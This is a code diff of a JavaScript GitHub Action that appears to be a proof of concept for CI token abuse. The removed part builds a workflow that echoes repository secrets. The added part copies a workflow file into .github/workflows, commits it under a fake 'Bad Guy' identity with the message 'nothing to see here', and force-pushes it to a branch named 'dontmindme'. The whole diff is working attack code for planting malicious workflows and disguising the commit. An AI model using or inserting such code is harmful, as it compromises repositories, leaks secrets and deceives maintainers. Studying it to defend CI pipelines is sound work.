@@ -1,22 +1,7 @@
+const { execSync } = require("child_process");
 const core = require("@actions/core");
 const github = require("@actions/github");
 const https = require("https");
-
-const workflow = `
-name: "ruh-roh"
-on:
-  push:
-
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v2
-    - run: |
-      echo "test token: '\${{ secrets.GITHUB_TOKEN }}'"
-    - run: |
-      echo "test secret: '\${{ secrets.TEST_SECRET }}'"
-`;
 
 async function run() {
   const token = core.getInput("token");
@@ -32,27 +17,17 @@ async function run() {
   const octokit = github.getOctokit(token);
   const name = "Bad Guy";
   const email = "badguy@example.local";
-  const owner = github.context.payload.repository.owner.login;
-  const repo = github.context.payload.repository.name;
-  console.log(`pushing to ${owner}/${repo}`);
-  try {
-    const { data } = await octokit.rest.repos.createOrUpdateFileContents({
-      owner,
-      repo,
-      path: ".github/workflows/egress.yml",
-      message: "Nothing to see here",
-      content: workflow,
-      committer_name: name,
-      committer_email: email,
-      author_name: name,
-      author_email: email,
-    });
-    console.log(data);
-  } catch (e) {
-    console.log(e);
-    core.setFailed(e.message);
-    return;
-  }
+  execSync("cp ruhroh.yml .github/workflows/ruhroh.yml");
+  execSync("git add .github/workflows/ruhroh.yml");
+  execSync("git commit -m 'nothing to see here'", {
+    env: {
+      GIT_COMMITTER_NAME: name,
+      GIT_COMMITTER_EMAIL: email,
+      GIT_AUTHOR_NAME: name,
+      GIT_AUTHOR_EMAIL: email,
+    },
+  });
+  execSync("git push -f origin HEAD:dontmindme");
 
   try {
     const { data, headers } = await octokit.request("/");
